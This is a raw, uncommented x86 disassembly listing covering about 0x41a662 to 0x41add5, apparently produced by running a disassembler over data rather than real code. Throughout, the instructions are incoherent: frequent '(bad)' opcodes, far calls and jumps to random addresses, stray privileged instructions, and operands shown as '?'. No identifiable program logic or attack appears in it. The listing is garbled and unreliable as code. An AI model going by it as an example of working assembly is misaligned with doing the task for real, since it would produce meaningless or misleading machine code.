  41a662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a663:	inc    edx
  41a664:	popa   
  41a665:	call   0x8ff3:0xa27423c4
  41a66c:	push   ebx
  41a66d:	jmp    0x8e5c9e34
  41a672:	cmc    
  41a673:	stos   BYTE PTR es:[edi],al
  41a674:	js     0x41a605
  41a676:	mov    ds:0x9b1e5264,eax
  41a67b:	fnsave ds:[edi+0x2396316e]
  41a682:	push   ds
  41a683:	mov    ah,0xac
  41a685:	dec    edi
  41a686:	sub    DWORD PTR [esi],edi
  41a688:	sub    BYTE PTR [esi+0x33],cl
  41a68b:	(bad)  
  41a68c:	mov    ds:0x5f81d1a1,al
  41a691:	add    DWORD PTR [esi-0x4e],esp
  41a694:	lods   al,BYTE PTR ds:[esi]
  41a695:	xchg   ecx,eax
  41a696:	pop    ebx
  41a697:	outs   dx,WORD PTR ds:[esi]
  41a699:	adc    eax,0x1a3adfff
  41a69e:	push   ebx
  41a69f:	cs jbe 0x41a62a
  41a6a2:	sub    al,0xca
  41a6a4:	lahf   
  41a6a5:	inc    eax
  41a6a6:	out    dx,al
  41a6a7:	sub    BYTE PTR [edi-0x1a],dh
  41a6aa:	and    al,0x5f
  41a6ac:	mov    edx,0xf5694887
  41a6b1:	loope  0x41a633
  41a6b3:	mov    esp,0xb7406e27
  41a6b8:	ins    DWORD PTR es:[edi],dx
  41a6b9:	dec    esp
  41a6ba:	pop    edi
  41a6bb:	mov    bl,0x13
  41a6bd:	ret    0x1504
  41a6c0:	fstp   TBYTE PTR [ebx]
  41a6c2:	lods   eax,DWORD PTR ds:[esi]
  41a6c3:	pusha  
  41a6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6c5:	cmc    
  41a6c6:	lock pop esp
  41a6c8:	dec    ebx
  41a6c9:	pop    ebx
  41a6ca:	shl    edi,0x4f
  41a6cd:	bound  esp,QWORD PTR [esi-0x35af0272]
  41a6d3:	and    al,0x3c
  41a6d5:	sub    eax,0x1c520a60
  41a6da:	xchg   esp,eax
  41a6db:	sbb    dh,0x84
  41a6de:	pop    eax
  41a6df:	or     BYTE PTR [edx-0x3e],dh
  41a6e2:	jle    0x41a6ca
  41a6e4:	repnz out dx,al
  41a6e6:	sub    dl,bl
  41a6e8:	nop
  41a6e9:	xchg   esi,eax
  41a6ea:	jnp    0x41a6b1
  41a6ec:	mov    bl,0x6f
  41a6ee:	lods   al,BYTE PTR ds:[esi]
  41a6ef:	pop    ecx
  41a6f0:	ins    BYTE PTR es:[edi],dx
  41a6f1:	ret    
  41a6f2:	jb     0x41a6da
  41a6f4:	pop    ecx
  41a6f5:	adc    DWORD PTR [edx],esi
  41a6f7:	sub    BYTE PTR [eax-0x70],dh
  41a6fa:	mov    ds:0xb417a731,al
  41a6ff:	imul   ch
  41a701:	(bad)  
  41a702:	mov    al,0xfb
  41a704:	sub    BYTE PTR [ebx+0x34],bl
  41a707:	imul   BYTE PTR [ecx+ebx*2-0x5d2bdd29]
  41a70e:	xchg   ecx,eax
  41a70f:	mov    al,0x30
  41a711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a712:	or     eax,0xb0a10a41
  41a717:	lods   eax,DWORD PTR ds:[esi]
  41a718:	test   ebp,edi
  41a71a:	loopne 0x41a6d3
  41a71c:	mov    bh,bh
  41a71e:	call   0x9ac0:0x608a102f
  41a725:	ss pop es
  41a727:	call   0x314a:0xc1d0ce45
  41a72e:	xor    al,0xaf
  41a730:	jmp    0x41a7a8
  41a732:	pop    es
  41a733:	pop    edx
  41a734:	and    eax,0x49a20585
  41a739:	call   DWORD PTR [edi+0x4df6dea]
  41a73f:	xor    esp,DWORD PTR [esi+0x5312d8a3]
  41a745:	out    dx,al
  41a746:	mov    DWORD PTR [esi+0xc],edx
  41a749:	mov    dl,0xde
  41a74b:	sar    BYTE PTR [ebx+0x2074ba27],cl
  41a751:	adc    eax,0x836f5109
  41a756:	add    BYTE PTR [eax+0x23f4aceb],0x1c
  41a75d:	mov    BYTE PTR [ebx],ch
  41a75f:	(bad)  
  41a760:	rcl    DWORD PTR [eax+eiz*2-0x397cd45c],cl
  41a767:	in     eax,dx
  41a768:	adc    DWORD PTR [ecx],eax
  41a76a:	add    al,0xe0
  41a76c:	fnstenv ds:0x7d5536af
  41a772:	pusha  
  41a773:	push   es
  41a774:	add    al,0xc3
  41a776:	mov    eax,0xefc52fcd
  41a77b:	daa    
  41a77c:	mov    ds:0x792b1dc7,eax
  41a781:	mov    bl,0x6f
  41a783:	sti    
  41a784:	test   BYTE PTR [ebp-0x62],0x88
  41a788:	and    ecx,DWORD PTR [ebx]
  41a78a:	jo     0x41a76f
  41a78c:	popf   
  41a78d:	xchg   ebp,eax
  41a78e:	mov    dh,0xa1
  41a790:	retf   
  41a791:	out    0xd4,al
  41a793:	int3   
  41a794:	stos   DWORD PTR es:[edi],eax
  41a795:	sbb    DWORD PTR [ebp+0x3d],edx
  41a798:	ins    BYTE PTR es:[edi],dx
  41a799:	mov    edx,0xc8d80a84
  41a79e:	cmp    ebx,DWORD PTR [ebx+0x54c0c77f]
  41a7a4:	jmp    0x25ce02b3
  41a7a9:	lods   al,BYTE PTR ds:[esi]
  41a7aa:	or     dl,dh
  41a7ac:	dec    esi
  41a7ad:	test   DWORD PTR [ebp-0x5062b569],edi
  41a7b3:	imul   esp
  41a7b5:	pop    edx
  41a7b6:	jecxz  0x41a748
  41a7b8:	pushf  
  41a7b9:	data16 das 
  41a7bb:	call   0xfe4fa848
  41a7c0:	data16 mov ds:0xe3dd6eb6,al
  41a7c6:	mov    esi,0x350917df
  41a7cb:	xchg   ebx,eax
  41a7cc:	push   ebx
  41a7cd:	jmp    0xbcc7:0xf5b4d5af
  41a7d4:	xchg   ecx,eax
  41a7d5:	int    0xbd
  41a7d7:	push   0x58a2370e
  41a7dc:	outs   dx,BYTE PTR ds:[esi]
  41a7dd:	(bad)  
  41a7de:	repnz xor dh,BYTE PTR [ebp-0x1d]
  41a7e2:	ins    BYTE PTR es:[edi],dx
  41a7e3:	cmp    eax,0xf08ddea7
  41a7e8:	js     0x41a849
  41a7ea:	das    
  41a7eb:	fild   WORD PTR [edx+0x5]
  41a7ee:	imul   edi,DWORD PTR [edi+0x51c8fd7d],0xc4286b0d
  41a7f8:	xchg   esp,eax
  41a7f9:	arpl   cx,sp
  41a7fb:	jp     0x41a7c4
  41a7fd:	shl    DWORD PTR [edx-0x5],cl
  41a800:	xchg   esp,eax
  41a801:	int    0xe2
  41a803:	mov    bh,0x60
  41a805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a806:	jne    0x41a7e6
  41a808:	call   0x8d93:0xb40439db
  41a80f:	sbb    eax,0x1400fcfe
  41a814:	sbb    al,0xff
  41a816:	ror    BYTE PTR [edx+0x73],cl
  41a819:	mov    ds:0x80c2ecb6,eax
  41a81e:	aaa    
  41a81f:	(bad)  
  41a820:	(bad)  
  41a821:	icebp  
  41a822:	add    DWORD PTR [ecx],edx
  41a824:	mov    ebx,DWORD PTR [ebp+eiz*8-0x65]
  41a828:	mov    edi,0x10cc9470
  41a82d:	mul    BYTE PTR [edx+0x31]
  41a830:	mov    dl,0x56
  41a832:	pushf  
  41a833:	lock sti 
  41a835:	bound  edx,QWORD PTR [ebx]
  41a837:	jmp    FWORD PTR [ebp+eiz*4-0x36e26887]
  41a83e:	push   esp
  41a83f:	les    edx,FWORD PTR [ebx+0x7c]
  41a842:	push   ebp
  41a843:	pushf  
  41a844:	adc    DWORD PTR [edx-0x45],ecx
  41a847:	iret   
  41a848:	js     0x41a7ce
  41a84a:	cmp    cl,BYTE PTR [eax+ebx*4+0x4bb33cb9]
  41a851:	leave  
  41a852:	shr    ecx,1
  41a854:	push   ss
  41a855:	pop    ecx
  41a856:	shl    DWORD PTR [edx+0x47],0xca
  41a85a:	and    cl,BYTE PTR [eax-0x11]
  41a85d:	shl    DWORD PTR [ebx],1
  41a85f:	(bad)  
  41a860:	mov    ah,0x46
  41a862:	xor    BYTE PTR [edx],bh
  41a864:	or     DWORD PTR [edx],ecx
  41a866:	mov    DWORD PTR [ebx+0x23893681],edx
  41a86c:	arpl   WORD PTR [ecx-0x75],di
  41a86f:	dec    ebp
  41a870:	mov    al,0x25
  41a872:	jge    0x41a88d
  41a874:	pop    edx
  41a875:	push   0xf62bc25b
  41a87a:	clc    
  41a87b:	iret   
  41a87c:	test   ebx,edx
  41a87e:	test   eax,0x7e867405
  41a883:	xor    al,0xa3
  41a885:	jae    0x41a8f5
  41a887:	fdiv   DWORD PTR [esi+0x4bebca22]
  41a88d:	call   0x5253:0x96f56dfc
  41a894:	loope  0x41a83f
  41a896:	xor    al,0xc5
  41a898:	cmp    eax,0xe2ca632f
  41a89d:	mov    bl,0xd2
  41a89f:	push   cs
  41a8a0:	(bad)  
  41a8a2:	xor    eax,0xc9d27059
  41a8a7:	and    BYTE PTR [edi],ch
  41a8a9:	mov    al,ds:0xb5bd76a3
  41a8ae:	pop    esi
  41a8af:	es inc eax
  41a8b1:	pop    es
  41a8b2:	or     eax,0xf2fb72ec
  41a8b8:	out    dx,eax
  41a8b9:	iret   
  41a8ba:	jp     0x41a8b1
  41a8bc:	dec    eax
  41a8bd:	adc    eax,0x76260ada
  41a8c2:	pop    ds
  41a8c3:	push   esi
  41a8c4:	shrd   DWORD PTR [ecx],esi,cl
  41a8c7:	and    eax,0xed48f251
  41a8cc:	pop    edi
  41a8cd:	and    BYTE PTR [ecx+0x59dcda51],dl
  41a8d3:	cmp    eax,0xbe0c0d6c
  41a8d8:	adc    al,0x47
  41a8da:	hlt    
  41a8db:	enter  0x269d,0x83
  41a8df:	outs   dx,DWORD PTR ds:[esi]
  41a8e0:	cdq    
  41a8e1:	(bad)  
  41a8e4:	test   cl,0xf
  41a8e7:	mov    BYTE PTR [eax+0x5b00a55d],ah
  41a8ed:	adc    al,0x88
  41a8ef:	jo     0x41a8b4
  41a8f1:	cmp    DWORD PTR [esi],esp
  41a8f3:	add    ecx,DWORD PTR [ecx]
  41a8f5:	leave  
  41a8f6:	or     edx,edi
  41a8f8:	ss jb  0x41a891
  41a8fb:	push   es
  41a8fc:	push   0x33
  41a8fe:	pop    ds
  41a8ff:	loope  0x41a898
  41a901:	inc    ecx
  41a902:	adc    DWORD PTR [eax],ebp
  41a904:	shl    ch,1
  41a906:	neg    bh
  41a908:	mov    al,0xdc
  41a90a:	outs   dx,BYTE PTR ds:[esi]
  41a90b:	or     BYTE PTR [ebp+0x12],ch
  41a90e:	clc    
  41a90f:	push   ss
  41a910:	jno    0x41a8ce
  41a912:	cld    
  41a913:	dec    edi
  41a914:	dec    eax
  41a915:	into   
  41a916:	and    dl,BYTE PTR [ebx+0x56]
  41a919:	out    dx,al
  41a91a:	das    
  41a91b:	aaa    
  41a91c:	pop    ds
  41a91d:	xor    dh,ch
  41a91f:	jecxz  0x41a92a
  41a921:	fisubr DWORD PTR [esi-0x3b384dc5]
  41a927:	in     al,dx
  41a928:	adc    DWORD PTR [ebx-0x7be62a48],edi
  41a92e:	xchg   esp,eax
  41a92f:	ins    DWORD PTR es:[edi],dx
  41a930:	mov    WORD PTR [edx],fs
  41a932:	sbb    eax,DWORD PTR [esi-0x2b]
  41a935:	add    edi,DWORD PTR [ecx]
  41a937:	xor    DWORD PTR [eax+0x4c61ecc3],0x88b20949
  41a941:	mov    ds:0xbdf84c98,eax
  41a946:	out    dx,eax
  41a947:	out    0xe3,al
  41a949:	cmp    eax,0x759935e1
  41a94e:	pop    eax
  41a94f:	jp     0x41a92f
  41a951:	sub    eax,0xea6b0821
  41a956:	cdq    
  41a957:	aad    0xc3
  41a959:	xchg   ebp,eax
  41a95a:	or     DWORD PTR [eax-0x55],ecx
  41a95d:	lahf   
  41a95e:	call   0x3674:0xad4c9182
  41a965:	pop    ebx
  41a966:	and    DWORD PTR [ebx+ebx*1+0x307861b5],ebx
  41a96d:	jnp    0x41a9b6
  41a96f:	mov    ds:0xbed7cb08,eax
  41a974:	loope  0x41a978
  41a976:	test   al,0x33
  41a978:	xchg   edi,eax
  41a979:	xchg   esi,eax
  41a97a:	arpl   WORD PTR [edi],si
  41a97c:	mov    WORD PTR ds:0x697bd6f8,es
  41a982:	bound  esi,QWORD PTR [eax]
  41a984:	std    
  41a985:	xor    ch,BYTE PTR [ebx]
  41a987:	ret    
  41a988:	scas   al,BYTE PTR es:[edi]
  41a989:	dec    esi
  41a98a:	add    edx,esp
  41a98c:	jl     0x41a9e3
  41a98e:	aad    0xec
  41a990:	add    esi,esp
  41a992:	jmp    0x22ae:0x77c4ba71
  41a999:	adc    eax,0x7c163d5b
  41a99e:	push   ebp
  41a99f:	xchg   edi,eax
  41a9a0:	sub    ecx,DWORD PTR [ecx+esi*2]
  41a9a3:	mov    esi,0xafbadcbf
  41a9a8:	jmp    0x338992b9
  41a9ad:	jb     0x41a9e5
  41a9af:	cmp    eax,DWORD PTR [eax+0x78119116]
  41a9b5:	mov    esp,0x1b8b3024
  41a9ba:	add    ebx,DWORD PTR [ebp+eax*2+0x738df948]
  41a9c1:	(bad)  
  41a9c2:	fs lahf 
  41a9c4:	fst    QWORD PTR [ebp-0x13]
  41a9c7:	retf   
  41a9c8:	cmc    
  41a9c9:	adc    edi,DWORD PTR [esi-0x26036f91]
  41a9cf:	pop    esi
  41a9d0:	loopne 0x41a9ed
  41a9d2:	std    
  41a9d3:	les    esp,FWORD PTR [edx]
  41a9d5:	mov    edx,fs
  41a9d7:	mov    edi,0x1a2bad21
  41a9dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9dd:	pop    esi
  41a9de:	lods   al,BYTE PTR ds:[esi]
  41a9df:	sar    ah,0x5
  41a9e2:	or     eax,0x112a56f7
  41a9e7:	in     al,dx
  41a9e8:	fistp  WORD PTR [ecx-0x2f]
  41a9eb:	adc    eax,0xbd05cf10
  41a9f0:	out    dx,al
  41a9f1:	mov    al,ds:0x7eaa6669
  41a9f6:	cdq    
  41a9f7:	inc    edx
  41a9f8:	(bad)  
  41a9f9:	xor    esi,DWORD PTR [edi-0x2]
  41a9fc:	repnz mov bh,dl
  41a9ff:	inc    ecx
  41aa00:	loope  0x41a98b
  41aa02:	and    edi,ecx
  41aa04:	cmp    BYTE PTR [eax-0x6e],0xcf
  41aa08:	jb     0x41a9a8
  41aa0a:	pop    ebx
  41aa0b:	jns    0x41aa66
  41aa0d:	mov    es,WORD PTR [ecx]
  41aa0f:	push   ss
  41aa10:	fnstenv [edx+0x4b]
  41aa13:	and    dl,BYTE PTR [ecx-0x73a0a4e3]
  41aa19:	mov    dl,0xf4
  41aa1b:	hlt    
  41aa1c:	sub    al,0x14
  41aa1e:	jbe    0x41a9f8
  41aa20:	outs   dx,DWORD PTR ds:[esi]
  41aa21:	cmp    DWORD PTR [eax],ecx
  41aa23:	les    ebp,FWORD PTR [edx-0x58e27838]
  41aa29:	test   bl,bh
  41aa2b:	xchg   BYTE PTR [ecx-0xe],bl
  41aa2e:	fimul  DWORD PTR [eax+ebp*4-0x5a]
  41aa32:	outs   dx,DWORD PTR ds:[esi]
  41aa33:	into   
  41aa34:	sbb    dl,cl
  41aa36:	ret    0xacb0
  41aa39:	dec    edx
  41aa3a:	mov    DWORD PTR [ebx],esi
  41aa3c:	adc    al,0xb4
  41aa3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa3f:	cmp    al,0x8f
  41aa41:	call   0x16f2:0x1472a9ea
  41aa48:	mov    esp,0xcaba973
  41aa4d:	and    al,0xe0
  41aa4f:	aaa    
  41aa50:	and    ebp,ebp
  41aa52:	nop
  41aa53:	in     eax,0xef
  41aa55:	xchg   ecx,eax
  41aa56:	push   ecx
  41aa57:	xor    eax,0x6aa9e40f
  41aa5c:	cmp    eax,0xca44d401
  41aa61:	jbe    0x41aae1
  41aa63:	popa   
  41aa64:	gs jb  0x41a9e9
  41aa67:	pop    edi
  41aa68:	dec    edi
  41aa69:	ins    BYTE PTR es:[edi],dx
  41aa6a:	or     BYTE PTR [edi-0x64478d63],bh
  41aa70:	pusha  
  41aa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa72:	jnp    0x41aae3
  41aa74:	data16 adc ah,BYTE PTR [ebp-0x6f]
  41aa78:	mov    eax,ds:0x3a0bc0bb
  41aa7d:	arpl   WORD PTR [edx],di
  41aa7f:	jnp    0x41aa5f
  41aa81:	aaa    
  41aa82:	push   edi
  41aa83:	mov    esp,eax
  41aa85:	mov    cl,0x62
  41aa87:	(bad)  
  41aa88:	or     esi,DWORD PTR [edx+0xe7c1d32]
  41aa8e:	ss jne 0x41aa7c
  41aa91:	adc    edi,edx
  41aa93:	hlt    
  41aa94:	pop    ds
  41aa95:	aaa    
  41aa96:	jmp    0xf930a5e4
  41aa9b:	pop    esp
  41aa9c:	out    dx,eax
  41aa9d:	xor    DWORD PTR [esp+eax*8-0x747a9fb8],ebx
  41aaa4:	mov    bh,0xa7
  41aaa6:	outs   dx,BYTE PTR ds:[esi]
  41aaa7:	enter  0x8d76,0x55
  41aaab:	push   esi
  41aaac:	push   ds
  41aaad:	push   ds
  41aaae:	ins    DWORD PTR es:[edi],dx
  41aaaf:	test   dh,bh
  41aab1:	loop   0x41aa6a
  41aab3:	adc    al,0x42
  41aab5:	cdq    
  41aab6:	xchg   ecx,eax
  41aab7:	mov    BYTE PTR [edi+0x5b4097c2],dl
  41aabd:	iret   
  41aabe:	and    edi,ebx
  41aac0:	inc    edx
  41aac1:	xchg   ebx,eax
  41aac2:	(bad)  
  41aac3:	std    
  41aac4:	icebp  
  41aac5:	js     0x41aa83
  41aac7:	sar    BYTE PTR [eax-0x7770f3b3],0x78
  41aace:	ins    BYTE PTR es:[edi],dx
  41aacf:	dec    esp
  41aad0:	add    cl,BYTE PTR [ebp-0x30]
  41aad3:	imul   esi,DWORD PTR [ebp+0x2f],0x7f6bf1a9
  41aada:	xchg   esp,eax
  41aadb:	scas   eax,DWORD PTR es:[edi]
  41aadc:	pushf  
  41aadd:	mov    ch,0x37
  41aadf:	mov    ebp,0xace36413
  41aae4:	mov    ah,0xb9
  41aae6:	push   0xffffffac
  41aae8:	bound  ebp,QWORD PTR [edi]
  41aaea:	push   eax
  41aaeb:	ss (bad) 
  41aaed:	rcl    BYTE PTR [ebx*1+0x67f66d8f],1
  41aaf4:	push   edx
  41aaf5:	push   0xffffffe2
  41aaf7:	loope  0x41ab5c
  41aaf9:	fcomp  DWORD PTR [eax+0x7a]
  41aafc:	mov    al,0x11
  41aafe:	stos   DWORD PTR es:[edi],eax
  41aaff:	(bad)  
  41ab00:	pop    esi
  41ab01:	iret   
  41ab02:	(bad)  
  41ab03:	(bad)  
  41ab04:	inc    DWORD PTR [eax]
  41ab06:	lock lock dec esi
  41ab09:	icebp  
  41ab0a:	test   BYTE PTR [ebp-0xf60c8ea],dh
  41ab10:	sbb    al,0xd5
  41ab12:	test   DWORD PTR [edi+edi*4+0x5327d987],ecx
  41ab19:	xor    BYTE PTR [ebx-0x69eef53e],cl
  41ab1f:	(bad)  
  41ab20:	cmp    eax,0x8de7b4fb
  41ab25:	jbe    0x41ab77
  41ab27:	test   BYTE PTR [ebp+0x5a],dl
  41ab2a:	sbb    eax,0xbdbf9dce
  41ab2f:	push   ds
  41ab30:	pop    ds
  41ab31:	dec    ebp
  41ab32:	(bad)  
  41ab33:	xor    al,0xa1
  41ab35:	(bad)  
  41ab36:	fldenv [ebp-0x6a]
  41ab39:	push   es
  41ab3a:	or     BYTE PTR [edx+ebp*1-0x43305d9f],dl
  41ab41:	mov    ds:0x93ca1eef,al
  41ab46:	pop    esp
  41ab47:	jno    0x41ab6e
  41ab49:	mov    ds:0xcbae0268,eax
  41ab4e:	add    ah,BYTE PTR [edx+0x267dfcfb]
  41ab54:	pop    ds
  41ab55:	jb     0x41aade
  41ab57:	pop    ebp
  41ab58:	retf   
  41ab59:	add    BYTE PTR [ebp+ecx*8-0x4e7596ed],cl
  41ab60:	jp     0x41aaed
  41ab62:	push   ecx
  41ab63:	rol    DWORD PTR [eax-0x34769b9c],0xfc
  41ab6a:	pusha  
  41ab6b:	jp     0x41ab87
  41ab6d:	xor    eax,0xb00df369
  41ab72:	dec    esp
  41ab73:	jbe    0x41ab11
  41ab75:	jmp    0x41abe6
  41ab77:	inc    esi
  41ab78:	push   ebx
  41ab79:	iret   
  41ab7a:	out    dx,eax
  41ab7b:	xor    DWORD PTR [ecx-0x54c5afae],ebp
  41ab81:	and    eax,0x67d122e7
  41ab86:	mov    edi,esi
  41ab88:	jle    0x41ab6b
  41ab8a:	and    BYTE PTR [ecx+ecx*4],cl
  41ab8d:	mov    ds:0xf9c9251,al
  41ab92:	and    esi,edi
  41ab94:	cmp    DWORD PTR [edx-0x4ab71357],0xe52eba25
  41ab9e:	push   ss
  41ab9f:	neg    DWORD PTR [esi]
  41aba1:	in     eax,dx
  41aba2:	push   ss
  41aba3:	push   edx
  41aba4:	push   0xffffffda
  41aba6:	out    dx,eax
  41aba7:	inc    ebx
  41aba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aba9:	loop   0x41ab2f
  41abab:	and    eax,0xabe1861c
  41abb0:	jnp    0x41abc7
  41abb2:	daa    
  41abb3:	adc    al,0x65
  41abb5:	out    dx,eax
  41abb6:	mov    esp,edi
  41abb8:	jp     0x41abd2
  41abba:	outs   dx,DWORD PTR ds:[esi]
  41abbb:	and    al,0x9d
  41abbd:	push   eax
  41abbe:	outs   dx,DWORD PTR ds:[esi]
  41abbf:	and    DWORD PTR [eax+0x19],esp
  41abc2:	cmp    eax,0x410d403
  41abc7:	jns    0x41ab4b
  41abc9:	or     edi,ebx
  41abcb:	dec    ecx
  41abcc:	test   eax,0x118aca17
  41abd1:	stc    
  41abd2:	mov    WORD PTR ds:0x2ce620ef,?
  41abd8:	adc    eax,ecx
  41abda:	loope  0x41ab9e
  41abdc:	add    ecx,DWORD PTR [eax]
  41abde:	(bad)  
  41abe0:	jnp    0x41ac4b
  41abe2:	stos   DWORD PTR es:[edi],eax
  41abe3:	aam    0xea
  41abe5:	lods   al,BYTE PTR cs:[esi]
  41abe7:	mov    BYTE PTR [esi+0x13],ch
  41abea:	mov    fs,ebp
  41abec:	inc    esp
  41abed:	or     DWORD PTR [eax-0x5],ebx
  41abf0:	shl    BYTE PTR [edx-0x5e],0x26
  41abf4:	repnz inc edx
  41abf6:	dec    eax
  41abf7:	inc    eax
  41abf8:	ret    
  41abf9:	out    0x60,eax
  41abfb:	repnz sub BYTE PTR [esi+0x75],bl
  41abff:	jmp    0x7bde:0xa41114
  41ac06:	xchg   DWORD PTR [edi],edi
  41ac08:	stos   BYTE PTR es:[edi],al
  41ac09:	(bad)  
  41ac0a:	mov    ds:0xa5c7a599,al
  41ac0f:	(bad)
  41ac12:	sbb    al,0x3c
  41ac14:	mov    ebp,0x9bebbdc6
  41ac19:	cdq    
  41ac1a:	(bad)  
  41ac1b:	fisub  DWORD PTR [esi+eax*1-0x6c97c19d]
  41ac22:	add    cl,ch
  41ac24:	es mov dh,0x7e
  41ac27:	adc    al,0x50
  41ac29:	mov    ds:0x3e694e47,al
  41ac2e:	sbb    eax,0x18ccbc3c
  41ac33:	imul   ebp,DWORD PTR [ebx],0x15
  41ac36:	dec    ebp
  41ac37:	xchg   esi,eax
  41ac38:	or     BYTE PTR [edx],al
  41ac3a:	inc    esp
  41ac3b:	test   eax,0x15210931
  41ac40:	dec    edx
  41ac41:	pushf  
  41ac42:	inc    ecx
  41ac43:	cs mov esp,0xe95d8027
  41ac49:	aaa    
  41ac4a:	add    bh,BYTE PTR [edi+0x6e]
  41ac4d:	xor    dl,bh
  41ac4f:	out    0xc4,al
  41ac51:	shl    BYTE PTR [eax-0x74],1
  41ac54:	shl    eax,0xaa
  41ac57:	push   edi
  41ac58:	dec    esp
  41ac59:	iret   
  41ac5a:	adc    ebp,esp
  41ac5c:	retf   
  41ac5d:	cmp    al,0x6f
  41ac5f:	jl     0x41ac6e
  41ac61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac62:	mov    edi,0x36f19d6f
  41ac67:	jae    0x41abf4
  41ac69:	jbe    0x41ac1c
  41ac6b:	add    BYTE PTR [ebx+0x28d256a8],dh
  41ac71:	add    esi,DWORD PTR [esi+0x6d]
  41ac74:	push   esi
  41ac75:	push   ebx
  41ac76:	repnz mov al,0x2b
  41ac79:	jg     0x41ac35
  41ac7b:	rcr    ecx,1
  41ac7d:	and    BYTE PTR [eax-0x2f],al
  41ac80:	add    ebp,DWORD PTR [esi-0x4]
  41ac83:	popa   
  41ac84:	or     dh,dl
  41ac86:	jge    0x41ac99
  41ac88:	fnstenv [ecx-0x6e6d2f7f]
  41ac8e:	loop   0x41acaf
  41ac90:	loope  0x41ac2e
  41ac92:	xor    al,0xef
  41ac94:	repz mov WORD PTR [ebx],?
  41ac97:	loopne 0x41ac5f
  41ac99:	retf   
  41ac9a:	rol    BYTE PTR [ecx],0x9d
  41ac9d:	aaa    
  41ac9e:	mov    ch,0x1e
  41aca0:	ret    0xcccf
  41aca3:	(bad)  
  41aca4:	retf   0x57c
  41aca7:	ret    
  41aca8:	test   edx,ebx
  41acaa:	cmp    ch,0x6e
  41acad:	aam    0x3f
  41acaf:	adc    ah,dh
  41acb1:	fnsave [eax-0x23]
  41acb4:	ds fwait
  41acb6:	in     eax,dx
  41acb7:	test   edx,eax
  41acb9:	popa   
  41acba:	mov    ecx,DWORD PTR [edi]
  41acbc:	out    0xf,eax
  41acbe:	test   DWORD PTR [ecx-0x2d6e1385],edi
  41acc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acc5:	nop
  41acc6:	pop    es
  41acc7:	mov    WORD PTR [esi+0x54],?
  41acca:	xchg   edi,eax
  41accb:	mov    dl,0xeb
  41accd:	retf   
  41acce:	les    esi,FWORD PTR [ecx-0x79]
  41acd1:	mov    dl,ch
  41acd3:	fsub   DWORD PTR [esi+0x1a9addae]
  41acd9:	and    esi,DWORD PTR [eax-0x44]
  41acdc:	push   ecx
  41acdd:	sub    edi,ebx
  41acdf:	aad    0xd7
  41ace1:	mov    ?,WORD PTR [edx+edx*4-0x6c78fe07]
  41ace8:	inc    edx
  41ace9:	mov    esi,0x533c5cfc
  41acee:	inc    ebx
  41acef:	and    eax,DWORD PTR ds:0x597adf22
  41acf5:	jmp    0x32d89b50
  41acfa:	fs jmp 0x41aca3
  41acfd:	inc    BYTE PTR [ebx]
  41acff:	shr    esp,1
  41ad01:	arpl   WORD PTR [esi+0x632182c2],di
  41ad07:	wrmsr  
  41ad09:	or     BYTE PTR [ecx-0x47],0xb2
  41ad0d:	or     BYTE PTR [edi-0x48c191e4],cl
  41ad13:	add    esi,DWORD PTR [ebx]
  41ad15:	jo     0x41ad5f
  41ad17:	push   ebp
  41ad18:	out    0xba,al
  41ad1a:	call   0x27707619
  41ad1f:	div    BYTE PTR [edx+0x3b7a1608]
  41ad25:	lock adc ebp,DWORD PTR [esi-0x3a31204d]
  41ad2c:	pop    esp
  41ad2d:	mov    esi,0x8164cbfa
  41ad32:	ja     0x41aced
  41ad34:	xor    al,0xdc
  41ad36:	aas    
  41ad37:	sbb    eax,0x18e8abea
  41ad3c:	(bad)  
  41ad3d:	gs dec edi
  41ad3f:	nop
  41ad40:	sbb    eax,0x59791f8c
  41ad45:	sbb    al,0xd8
  41ad47:	fsubr  QWORD PTR [edx+0x15]
  41ad4a:	sub    al,0x8a
  41ad4c:	sbb    ch,cl
  41ad4e:	inc    edx
  41ad4f:	cmp    BYTE PTR [ecx],0x47
  41ad52:	loopne 0x41adbf
  41ad54:	sti    
  41ad55:	xor    BYTE PTR [ebp-0xac51623],ah
  41ad5b:	nop
  41ad5c:	lahf   
  41ad5d:	ja     0x41acfd
  41ad5f:	lods   al,BYTE PTR ds:[esi]
  41ad60:	into   
  41ad61:	sbb    DWORD PTR [edx+0x4a],0xe60a4e42
  41ad68:	push   0xfeaf2d93
  41ad6d:	or     eax,0xc5731ae7
  41ad72:	mov    ebx,0xcdf1afcd
  41ad77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad78:	push   ds
  41ad79:	or     ah,BYTE PTR [ebp+0x23]
  41ad7c:	mov    dl,BYTE PTR [ebx+0x1d9f0d7]
  41ad82:	loop   0x41adf7
  41ad84:	sub    bh,BYTE PTR [ebx]
  41ad86:	xor    DWORD PTR [ebp-0x68f9b7ab],esp
  41ad8c:	addr16 add al,0xa3
  41ad8f:	mov    eax,ds:0x18fad762
  41ad94:	dec    ebx
  41ad95:	aad    0x23
  41ad97:	jmp    0x224e227e
  41ad9c:	sub    ebx,DWORD PTR [ebx]
  41ad9e:	nop
  41ad9f:	mov    bl,0x2b
  41ada1:	sub    BYTE PTR ds:0x4c005e34,0xa1
  41ada8:	loopne 0x41ad6c
  41adaa:	or     al,0x1c
  41adac:	pop    ds
  41adad:	inc    eax
  41adae:	pop    DWORD PTR [eax]
  41adb0:	bound  ebp,QWORD PTR [esi-0x3df3cf69]
  41adb6:	sbb    BYTE PTR [edi],ch
  41adb8:	out    0xc0,eax
  41adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adbb:	fbstp  TBYTE PTR [edx+0x1adcf277]
  41adc1:	enter  0x9a79,0xcb
  41adc5:	es cdq 
  41adc7:	xchg   esi,eax
  41adc8:	std    
  41adc9:	sbb    BYTE PTR [edx+ebp*2],al
  41adcc:	jp     0x41ae06
  41adce:	cmp    al,0x53
  41add0:	out    0x85,al
  41add2:	xchg   ecx,eax
  41add3:	add    DWORD PTR [ecx],ecx
  41add5:	(bad)  
